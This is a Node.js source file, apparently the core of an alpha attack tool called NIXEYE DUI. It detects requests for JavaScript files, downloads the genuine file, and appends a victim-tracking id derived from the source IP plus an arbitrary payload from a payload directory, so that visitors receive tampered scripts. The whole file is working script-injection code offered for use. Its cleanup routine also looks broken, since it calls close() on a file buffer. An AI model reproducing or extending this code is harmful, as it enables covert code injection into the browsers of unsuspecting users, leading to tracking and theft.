/*
 * 
 * NIXEYE DUI Core
 * ======== (alpha) 
 * 
 */


// logger requires
var errorlog = require('./logs.core.js').ErrorLog,
	eventlog = require('./logs.core.js').EventLog;


// external libs
var crypto = require('crypto'),
	cfg = require('./cnf.core.js').syspaths,
	url = require("url"),
	path = require("path"),
	request = require('request'),
	fs = require('graceful-fs');



// declaring main prototype holder
DuiCore = function(){};



/* 
 * URL Inspection Prototype
 * ================================================
 * 
 * Receives url and inspects for desired file type
 * 
 * ================================================
 */
 
DuiCore.prototype.matchUrl = function(xurl, callback){
	
	// validating gathered url
	if((typeof(xurl) === 'undefined') || (xurl === null)){callback(null, false);}
	else{
		
		// parsing given url
		var suffix = '.js',
			parsed = url.parse(xurl),
			jsfile = path.basename(parsed.pathname);
		
		// matching full url
		if(jsfile.substring(jsfile.length - suffix.length) === suffix){
			
			// matching parsed url file name
			callback(null, true);
			
		}else{callback(null, false);}
		
	}
};




/* 
 * URL Inspection Prototype
 * ================================================
 * 
 * Injects targeted file with desired payload
 * 
 * ================================================
 */

DuiCore.prototype.urlInjection = function(xurl, srcip, payload, callback){
	
	// validating gathered data
	if(
		((typeof(xurl) === 'undefined') || (xurl === null) || (xurl.length <= 0)) ||
		((typeof(srcip) === 'undefined') || (srcip === null) || (srcip.length <= 0)) ||
		((typeof(payload) === 'undefined') || (payload === null))
		
	){callback(null, false);}
	else{
		
		// loading required data
		var xdata = fs.readFileSync(cfg.payload + payload),
			parsed = url.parse(xurl),
			jsfile = path.basename(parsed.pathname);
		
		
		// clean up sweeper
		var cleanup = function(){
			
			xdata.close();
			dest.removeListener('finish', finish);
			dest.removeListener('error', error);
			src.removeListener('error', error);
		};
		
		// finish trigger
		var finish = function(){
			
			cleanup();
			fs.appendFile(
				
				// appending unique id
				cfg.tmp + jsfile, 
				"\nvar nxid='" + crypto.createHash('sha1').update(srcip).digest('hex').toString() + "';", 
			
			function(err, append1){
				
				// appending desired payload
				fs.appendFile(cfg.tmp + jsfile, xdata, function(err){callback(null, jsfile);});
			});
		};
		
		
		
		// error trigger
		var error = function(err){
			cleanup();
			callback(null, false);
		};

		var src = request(xurl),
			dest = fs.createWriteStream(cfg.tmp + jsfile);

		dest.addListener('finish', finish);
		dest.addListener('error', error);
		src.addListener('error', error);

		src.pipe(dest);
	}
};









// exporting prototypes
exports.DuiCore = DuiCore;
